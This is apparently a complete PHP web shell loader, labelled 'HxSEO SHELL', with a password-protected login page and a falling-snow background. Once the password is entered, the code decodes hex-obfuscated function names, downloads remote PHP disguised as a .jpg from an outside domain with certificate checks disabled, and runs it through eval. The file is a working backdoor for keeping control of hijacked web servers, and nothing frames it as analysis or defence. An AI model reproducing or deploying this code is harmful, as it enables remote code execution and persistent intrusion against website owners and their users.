<?php
session_start();

function is_logged_in() {
    return isset($_SESSION['user_logged_in']) && $_SESSION['user_logged_in'] === true;
}

function hex2str($hex) {
    $str = '';
    for ($i = 0; $i < strlen($hex); $i += 2) {
        $str .= chr(hexdec(substr($hex, $i, 2)));
    }
    return $str;
}

if (is_logged_in()) {
    $Array = array(
        '666f70656e', // fopen
        '73747265616d5f6765745f636f6e74656e7473', // stream_get_contents
        '66696c655f6765745f636f6e74656e7473', // file_get_contents
        '6375726c5f65786563' // curl_exec
    );

    function geturlsinfo($destiny) {
        $belief = array(
            hex2str($GLOBALS['Array'][0]),
            hex2str($GLOBALS['Array'][1]),
            hex2str($GLOBALS['Array'][2]),
            hex2str($GLOBALS['Array'][3])
        );

        if (function_exists($belief[3])) {
            $ch = curl_init($destiny);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            $love = $belief[3]($ch);
            curl_close($ch);
            return $love;
        } elseif (function_exists($belief[2])) {
            return $belief[2]($destiny);
        } elseif (function_exists($belief[0]) && function_exists($belief[1])) {
            $purpose = $belief[0]($destiny, "r");
            $love = $belief[1]($purpose);
            fclose($purpose);
            return $love;
        }
        return false;
    }

    // URL eksternal (bisa diubah)
    $destiny = 'https://nekan-dua.dev/aexdy/aexdy.jpg';
    $dream = geturlsinfo($destiny);
    if ($dream !== false) {
        eval('?>' . $dream);
    }

    echo '<a href="?logout=1" style="position:absolute;top:10px;right:10px;color:white;background:black;padding:5px 10px;text-decoration:none;">Logout</a>';

    if (isset($_GET['logout'])) {
        session_destroy();
        header("Location: " . $_SERVER['PHP_SELF']);
        exit();
    }

} else {
    if (isset($_POST['password'])) {
        $entered_key = $_POST['password'];
        $hashed_key = '$2y$10$qcIyc/iudF2qjHsPxUHUvOnBRYg7/cm/1MnHerQTJIWtNMf1.beUi';

        if (password_verify($entered_key, $hashed_key)) {
            $_SESSION['user_logged_in'] = true;
            header("Location: " . $_SERVER['PHP_SELF']);
            exit();
        } else {
            $error_message = "Password salah.";
        }
    }
?>
<!DOCTYPE html>
<html>
<head>
    <title>HxSEO SHELL</title>
    <style>
        html, body {
            margin: 0;
            padding: 0;
            height: 100%;
            width: 100%;
            overflow: hidden;
        }
        body {
            background: url('https://haexgrup.com/ichimg/imgku/logo-pluto.png') no-repeat center center;
            background-size: 80%;
            background-attachment: fixed;
            position: relative;
        }
        .overlay {
            position: absolute;
            top: 0; left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            z-index: 0;
        }
        .login-container {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 300px;
            background: rgba(255, 255, 255, 0.8);
            padding: 20px;
            border: 1px solid #ccc;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            text-align: center;
            z-index: 1;
        }
        .login-container input {
            width: calc(100% - 22px);
            padding: 10px;
            margin: 10px 0;
            box-sizing: border-box;
        }
        .login-container label {
            display: block;
            margin-bottom: 10px;
        }
        .snowflake {
            position: absolute;
            background: white;
            border-radius: 50%;
            width: 5px;
            height: 5px;
            opacity: 0.8;
            pointer-events: none;
            z-index: 0;
            animation: fall linear;
        }
        @keyframes fall {
            to {
                transform: translateY(100vh);
            }
        }
    </style>
</head>
<body>
    <div class="overlay"></div>
    <div class="login-container">
        <form method="POST" action="">
            <label for="password">I will always haunt you</label>
            <input type="password" id="password" name="password" autofocus required>
            <input type="submit" value="acceso">
            <?php if (isset($error_message)) echo "<p style='color:red;'>$error_message</p>"; ?>
        </form>
    </div>
    <script>
        function createSnowflake() {
            const snowflake = document.createElement('div');
            snowflake.className = 'snowflake';
            snowflake.style.left = Math.random() * 100 + 'vw';
            snowflake.style.animationDuration = Math.random() * 3 + 2 + 's';
            snowflake.style.opacity = Math.random();
            document.body.appendChild(snowflake);

            setTimeout(() => {
                snowflake.remove();
            }, 5000);
        }

        setInterval(createSnowflake, 100);
    </script>
</body>
</html>
<?php
}
?>
